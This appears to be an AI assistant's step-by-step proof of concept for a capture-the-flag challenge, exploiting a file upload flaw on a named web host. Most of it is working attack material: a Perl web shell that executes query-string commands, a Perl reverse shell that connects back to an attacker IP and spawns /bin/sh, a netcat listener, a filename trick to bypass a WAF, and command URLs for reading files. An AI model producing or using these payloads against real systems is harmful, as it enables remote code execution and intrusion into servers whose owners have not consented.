Here’s a **combined PoC (Proof of Concept)** that covers **both attack paths** — using a **Perl Web Shell** _and_ a **Perl Reverse Shell**, depending on which one works best in the CTF environment.

---

## 🧨 PoC: File Upload Exploitation (Perl Web Shell + Reverse Shell)

---

### 🎯 **Goal**

Exploit a vulnerable file upload functionality to either:

1. Execute system commands directly via a **web shell**, _or_
2. Get full shell access using a **reverse shell**.

---

## 🔧 Requirements

- Kali Linux (or similar)
- Burp Suite
- Netcat (`nc`)
- Your IP address (Kali box IP, e.g., `192.168.1.100`)
- Target URL: `http://hacksmith.webhop.me:5565`

---

## 📁 **Step 1: Prepare Two Payloads**

---

### **A. Perl Web Shell Payload (cmdshell.pl)**

Save as: `cmdshell.pl`

```perl
#!/usr/bin/perl
print "Content-type: text/html\n\n";
my $cmd = $ENV{'QUERY_STRING'};
print "<pre>";
system($cmd);
print "</pre>";
```

---

### **B. Perl Reverse Shell Payload (revshell.pl)**

Save as: `revshell.pl`

```perl
#!/usr/bin/perl
use Socket;
$ip = "192.168.1.100";  # Change to your Kali IP
$port = 4444;
socket(S, PF_INET, SOCK_STREAM, getprotobyname("tcp"));
if (connect(S, sockaddr_in($port, inet_aton($ip)))) {
  open(STDIN, ">&S");
  open(STDOUT, ">&S");
  open(STDERR, ">&S");
  exec("/bin/sh -i");
}
```

---

## 🚀 **Step 2: Start Netcat Listener (for Reverse Shell)**

```bash
nc -lvnp 4444
```

---

## 🕵️‍♂️ **Step 3: Upload Both Files via Burp Suite**

- Intercept file upload request.
- Modify filename to bypass WAF:
    - `cmdshell.pl;.jpg`
    - `revshell.pl;.jpg`
- Use `Content-Type: image/jpeg` or `application/octet-stream`.

📌 **Hint:** If upload path is predictable (e.g., `/uploads/`), you can try accessing:

```bash
http://hacksmith.webhop.me:5565/uploads/cmdshell.pl
http://hacksmith.webhop.me:5565/uploads/revshell.pl
```

---

## 🔓 **Step 4A: Use the Web Shell**

Try direct access:

```bash
http://hacksmith.webhop.me:5565/uploads/cmdshell.pl?whoami
http://hacksmith.webhop.me:5565/uploads/cmdshell.pl?ls+-la
http://hacksmith.webhop.me:5565/uploads/cmdshell.pl?cat+/var/www/html/flag.txt
```

> ✅ If this works, you'll directly see command output in the browser.

---

## 🔁 **Step 4B: Trigger the Reverse Shell**

If web shell doesn’t work or command output is restricted:

```bash
http://hacksmith.webhop.me:5565/uploads/revshell.pl
```

> ✅ If successful, you'll get a reverse shell in your `nc` terminal.

---

## 🏁 **Step 5: Find the Flag**

From either shell:

```bash
find / -name '*flag*' 2>/dev/null
cat /var/www/html/flag.txt
```

Expected output:

```
P3RL_B3AST
```

---

## 📸 **Step 6: Take Screenshots**

- File upload request in Burp
- Shell access (web or reverse)
- Command used to find and print the flag
- Flag output in terminal or browser

---

## ✅ Summary

|Method|URL Example|Benefit|
|---|---|---|
|Web Shell|`/uploads/cmdshell.pl?cat+/flag.txt`|Simple, fast|
|Reverse Shell|`/uploads/revshell.pl` + listener (`nc -lvnp 4444`)|Full terminal access|

---

Let me know if you want a **Burp Suite request template** or need help modifying this for `curl`-based testing.